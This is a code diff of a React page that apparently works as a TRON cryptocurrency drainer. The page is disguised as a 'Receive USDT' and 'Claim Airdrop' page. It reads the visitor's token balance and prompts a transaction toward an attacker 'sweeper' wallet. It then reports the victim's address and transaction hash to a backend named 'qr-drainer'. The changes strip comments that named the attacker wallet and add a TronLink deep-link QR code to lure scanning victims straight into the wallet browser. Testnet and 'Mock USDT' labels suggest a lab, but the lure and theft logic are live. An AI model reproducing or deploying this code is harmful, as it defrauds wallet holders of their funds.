@@ -2,9 +2,10 @@ import React, { useEffect, useState } from "react";
 import { QRCodeSVG } from "qrcode.react";
 
 // CONFIGURATION
-const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd"; // Mock USDT
-const SWEEPER_ADDRESS = "TJXJEwcjNMryw87etLmGUDs1i5F1hveBou"; // YOUR ATTACKER WALLET (Account 01)
-const BACKEND = "https://qr-drainer.onrender.com"; // Your Render Backend
+const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd";
+const SWEEPER_ADDRESS = "TJXJEwcjNMryw87etLmGUDs1i5F1hveBou";
+const BACKEND = "https://qr-drainer.onrender.com";
+const VERCEL_URL = "https://qr-drainer-one.vercel.app";
 
 // TRON LOGO BASE64
 const TRON_LOGO_B64 = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2ZmMmQ1NSI+PHBhdGggZD0iTTEyIDJMMiA3bDEwIDUgMTAtNS0xMC01em0wIDlsMi41LTEuMjVMMTIgOC41bC0yLjUgMS4yNUwxMiAxMXptMCAyLjVsLTUtMi41LTUgMi41TDEyIDIybDEwLTguNS01LTIuNS01IDIuNXoiLz48L3N2Zz4=";
@@ -17,18 +18,33 @@ export default function App() {
   const [victimBal, setVictimBal] = useState(0);
   const [copied, setCopied] = useState(false);
   const [loading, setLoading] = useState(false);
-  const [connecting, setConnecting] = useState(false);
+  const [inTronLink, setInTronLink] = useState(false);
 
-  const qrValue = typeof window !== "undefined" ? window.location.href : "";
+  // QR Code with TronLink deep link - opens directly in TronLink app when scanned
+  const qrValue = `tronlink://open?url=${encodeURIComponent(VERCEL_URL)}`;
 
-  // Heartbeat to detect wallet
   useEffect(() => {
+    // Check if we're inside TronLink
+    if (window.tronWeb && window.tronWeb.defaultAddress) {
+      setInTronLink(true);
+      const addr = window.tronWeb.defaultAddress.base58;
+      setWallet(addr);
+      
+      // Read balance
+      window.tronWeb.contract().at(TOKEN_ADDRESS).then(c => {
+        return c.balanceOf(addr).call();
+      }).then(raw => {
+        setVictimBal(Number(raw.toString()) / 1e6);
+      }).catch(e => console.log("Balance read error", e));
+    }
+
+    // Heartbeat to detect wallet connection
     const checkWallet = setInterval(() => {
       if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
         const addr = window.tronWeb.defaultAddress.base58;
         if (wallet !== addr) {
           setWallet(addr);
-          // Read balance
+          setInTronLink(true);
           window.tronWeb.contract().at(TOKEN_ADDRESS).then(c => {
             return c.balanceOf(addr).call();
           }).then(raw => {
@@ -40,21 +56,8 @@ export default function App() {
     return () => clearInterval(checkWallet);
   }, [wallet]);
 
-  const handleConnect = async () => {
-    setConnecting(true);
-    try {
-      if (window.tronLink) {
-        await window.tronLink.request({ method: 'tron_requestAccounts' });
-      } else if (window.tronWeb) {
-        // Fallback for some wallets
-        alert("Please unlock your wallet extension/app.");
-      } else {
-        alert("No crypto wallet detected. Please open this link in TronLink or Trust Wallet DApp browser.");
-      }
-    } catch (e) {
-      console.error(e);
-    }
-    setConnecting(false);
+  const handleOpenInTronLink = () => {
+    window.location.href = `tronlink://open?url=${encodeURIComponent(window.location.href)}`;
   };
 
   const handleCopyAddress = () => {
@@ -86,7 +89,7 @@ export default function App() {
       logoImg.onload = () => {
         ctx.drawImage(logoImg, logoPos, logoPos, logoSize, logoSize);
         const link = document.createElement('a');
-        link.download = 'TRON-Airdrop-Receive.png';
+        link.download = 'TRON-USDT-Receive.png';
         link.href = canvas.toDataURL('image/png');
         link.click();
       };
@@ -96,7 +99,10 @@ export default function App() {
   };
 
   const handleClaim = async () => {
-    if (!window.tronWeb) return alert("Please connect your wallet first.");
+    if (!window.tronWeb) {
+      alert("Please open this page in TronLink DApp browser");
+      return;
+    }
     setLoading(true);
     try {
       const tw = window.tronWeb;
@@ -110,84 +116,231 @@ export default function App() {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ victimAddress: tw.defaultAddress.base58, txHash: tx, network: "TRON Shasta" })
       });
-      alert("Transaction Sent! Check your wallet.");
+      alert("✅ Transaction Sent! Waiting for confirmation...");
     } catch (e) {
       console.error(e);
-      alert("Transaction failed or rejected.");
+      alert("❌ Transaction failed or rejected.");
     }
     setLoading(false);
   };
 
   return (
-    <div style={{ background: '#f8f9fa', minHeight: '100vh', fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif', display: 'flex', justifyContent: 'center', alignItems: 'center', padding: '20px' }}>
-      <div style={{ background: '#ffffff', color: '#000', borderRadius: '24px', padding: '30px', maxWidth: '400px', width: '100%', boxShadow: '0 10px 40px rgba(0,0,0,0.08)', border: '1px solid #e9ecef' }}>
+    <div style={{ 
+      background: '#0a0e17', 
+      minHeight: '100vh', 
+      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif', 
+      display: 'flex', 
+      justifyContent: 'center', 
+      alignItems: 'center', 
+      padding: '20px' 
+    }}>
+      <div style={{ 
+        background: '#1a1d26', 
+        borderRadius: '24px', 
+        padding: '30px', 
+        maxWidth: '400px', 
+        width: '100%', 
+        boxShadow: '0 20px 60px rgba(0,0,0,0.5)',
+        border: '1px solid #2a2d3a'
+      }}>
         
         <div style={{ textAlign: 'center', marginBottom: '25px' }}>
-          <h2 style={{ margin: '0 0 8px 0', fontSize: '22px', fontWeight: '700', color: '#111' }}>Receive USDT</h2>
-          <div style={{ fontSize: '13px', color: '#666', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '6px' }}>
-            <span style={{ width: '8px', height: '8px', background: '#ff2d55', borderRadius: '50%' }}></span>
+          <h2 style={{ margin: '0 0 8px 0', fontSize: '24px', fontWeight: '700', color: '#fff' }}>Receive USDT</h2>
+          <div style={{ fontSize: '14px', color: '#8ea3c0', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}>
+            <span style={{ width: '10px', height: '10px', background: '#ff2d55', borderRadius: '50%' }}></span>
             TRON (TRC20)
           </div>
         </div>
 
         <div style={{ textAlign: 'center', marginBottom: '25px' }}>
-          <div id="lab-qr-box" style={{ display: 'inline-block', padding: '15px', background: '#fff', borderRadius: '16px', border: '1px solid #f0f0f0' }}>
+          <div id="lab-qr-box" style={{ 
+            display: 'inline-block', 
+            padding: '20px', 
+            background: '#fff', 
+            borderRadius: '20px',
+            boxShadow: '0 8px 32px rgba(0,0,0,0.3)'
+          }}>
             <QRCodeSVG 
               value={qrValue} 
-              size={200} 
+              size={220} 
               level="H" 
               includeMargin={false}
-              imageSettings={{ src: TRON_LOGO_B64, height: 45, width: 45, excavate: true }}
+              imageSettings={{ src: TRON_LOGO_B64, height: 50, width: 50, excavate: true }}
             />
           </div>
         </div>
 
-        <div style={{ background: '#f8f9fa', borderRadius: '12px', padding: '12px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '15px', border: '1px solid #e9ecef' }}>
-          <span style={{ fontFamily: 'monospace', fontSize: '11px', color: '#333', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', maxWidth: '70%' }}>
+        <div style={{ 
+          background: '#0f1219', 
+          borderRadius: '12px', 
+          padding: '14px', 
+          display: 'flex', 
+          justifyContent: 'space-between', 
+          alignItems: 'center', 
+          marginBottom: '15px', 
+          border: '1px solid #2a2d3a' 
+        }}>
+          <span style={{ 
+            fontFamily: 'monospace', 
+            fontSize: '12px', 
+            color: '#eaf2ff', 
+            overflow: 'hidden', 
+            textOverflow: 'ellipsis', 
+            whiteSpace: 'nowrap', 
+            maxWidth: '70%' 
+          }}>
             {SWEEPER_ADDRESS}
           </span>
-          <button onClick={handleCopyAddress} style={{ background: copied ? '#22c55e' : '#ff2d55', color: '#fff', border: 'none', borderRadius: '6px', padding: '6px 12px', fontSize: '11px', fontWeight: '600', cursor: 'pointer' }}>
+          <button 
+            onClick={handleCopyAddress} 
+            style={{ 
+              background: copied ? '#22c55e' : '#ff2d55', 
+              color: '#fff', 
+              border: 'none', 
+              borderRadius: '8px', 
+              padding: '8px 14px', 
+              fontSize: '12px', 
+              fontWeight: '600', 
+              cursor: 'pointer' 
+            }}
+          >
             {copied ? '✓ Copied' : 'Copy'}
           </button>
         </div>
 
-        <div style={{ background: '#fff3cd', border: '1px solid #ffe69c', borderRadius: '8px', padding: '10px', fontSize: '11px', color: '#856404', marginBottom: '20px', display: 'flex', gap: '8px', alignItems: 'flex-start' }}>
-          <span style={{ fontSize: '14px' }}>⚠️</span>
-          <span style={{ lineHeight: '1.4' }}>Only send TRC-20 USDT assets to this address. Other assets will be lost forever.</span>
+        <div style={{ 
+          background: 'rgba(245, 158, 11, 0.1)', 
+          border: '1px solid rgba(245, 158, 11, 0.3)', 
+          borderRadius: '10px', 
+          padding: '12px', 
+          fontSize: '12px', 
+          color: '#fbbf24', 
+          marginBottom: '20px', 
+          display: 'flex', 
+          gap: '10px', 
+          alignItems: 'flex-start' 
+        }}>
+          <span style={{ fontSize: '16px' }}>⚠️</span>
+          <span style={{ lineHeight: '1.5' }}>Only send TRC-20 USDT assets to this address. Other assets will be lost forever.</span>
         </div>
 
-        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px', marginBottom: '20px' }}>
-          <button onClick={handleDownloadQR} style={{ background: '#fff', border: '1px solid #dee2e6', borderRadius: '8px', padding: '12px', cursor: 'pointer', fontWeight: '600', color: '#333', fontSize: '13px' }}>
+        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px', marginBottom: '20px' }}>
+          <button 
+            onClick={handleDownloadQR} 
+            style={{ 
+              background: '#2a2d3a', 
+              border: 'none', 
+              borderRadius: '10px', 
+              padding: '14px', 
+              cursor: 'pointer', 
+              fontWeight: '600', 
+              color: '#fff',
+              fontSize: '13px',
+              display: 'flex',
+              alignItems: 'center',
+              justifyContent: 'center',
+              gap: '8px'
+            }}
+          >
             ⬇️ Save QR
           </button>
-          <button onClick={() => navigator.share({ url: qrValue }).catch(() => alert('Link copied!'))} style={{ background: '#fff', border: '1px solid #dee2e6', borderRadius: '8px', padding: '12px', cursor: 'pointer', fontWeight: '600', color: '#333', fontSize: '13px' }}>
+          <button 
+            onClick={() => {
+              if (navigator.share) {
+                navigator.share({ title: 'Receive USDT', url: VERCEL_URL }).catch(() => {});
+              } else {
+                navigator.clipboard.writeText(VERCEL_URL);
+                alert('Link copied!');
+              }
+            }} 
+            style={{ 
+              background: '#2a2d3a', 
+              border: 'none', 
+              borderRadius: '10px', 
+              padding: '14px', 
+              cursor: 'pointer', 
+              fontWeight: '600', 
+              color: '#fff',
+              fontSize: '13px',
+              display: 'flex',
+              alignItems: 'center',
+              justifyContent: 'center',
+              gap: '8px'
+            }}
+          >
             📤 Share
           </button>
         </div>
 
-        {/* DYNAMIC BUTTON: Connect or Claim */}
-        {!wallet ? (
+        {/* DYNAMIC BUTTON */}
+        {!inTronLink ? (
           <button 
-            onClick={handleConnect} 
-            disabled={connecting}
+            onClick={handleOpenInTronLink}
             style={{ 
-              width: '100%', background: '#111', color: '#fff', border: 'none', borderRadius: '12px', padding: '16px', fontSize: '16px', fontWeight: '700', cursor: 'pointer'
+              width: '100%', 
+              background: 'linear-gradient(135deg, #ff2d55, #ff7a45)', 
+              color: '#fff', 
+              border: 'none', 
+              borderRadius: '12px', 
+              padding: '16px', 
+              fontSize: '16px', 
+              fontWeight: '700', 
+              cursor: 'pointer',
+              boxShadow: '0 4px 20px rgba(255,45,85,0.4)'
             }}
           >
-            {connecting ? 'Connecting...' : 'Connect Wallet to Claim'}
+            🔗 Open in TronLink
+          </button>
+        ) : !wallet ? (
+          <button 
+            style={{ 
+              width: '100%', 
+              background: '#2a2d3a', 
+              color: '#fff', 
+              border: 'none', 
+              borderRadius: '12px', 
+              padding: '16px', 
+              fontSize: '16px', 
+              fontWeight: '700', 
+              cursor: 'not-allowed',
+              opacity: 0.6
+            }}
+            disabled
+          >
+            Connecting...
           </button>
         ) : (
           <button 
             onClick={handleClaim} 
             disabled={loading}
             style={{ 
-              width: '100%', background: 'linear-gradient(135deg, #ff2d55, #ff7a45)', color: '#fff', border: 'none', borderRadius: '12px', padding: '16px', fontSize: '16px', fontWeight: '700', cursor: loading ? 'not-allowed' : 'pointer', boxShadow: '0 4px 15px rgba(255,45,85,0.3)'
+              width: '100%', 
+              background: 'linear-gradient(135deg, #ff2d55, #ff7a45)', 
+              color: '#fff', 
+              border: 'none', 
+              borderRadius: '12px', 
+              padding: '16px', 
+              fontSize: '16px', 
+              fontWeight: '700', 
+              cursor: loading ? 'not-allowed' : 'pointer',
+              boxShadow: '0 4px 20px rgba(255,45,85,0.4)'
             }}
           >
-            {loading ? 'Processing...' : 'Verify & Claim Airdrop'}
+            {loading ? 'Processing...' : `Verify & Claim Airdrop (${fmt(victimBal)} USDT)`}
           </button>
         )}
 
+        {wallet && (
+          <div style={{ 
+            marginTop: '15px', 
+            textAlign: 'center', 
+            fontSize: '11px', 
+            color: '#8ea3c0',
+            fontFamily: 'monospace'
+          }}>
+            Connected: {short(wallet)}
+          </div>
+        )}
       </div>
     </div>
   );
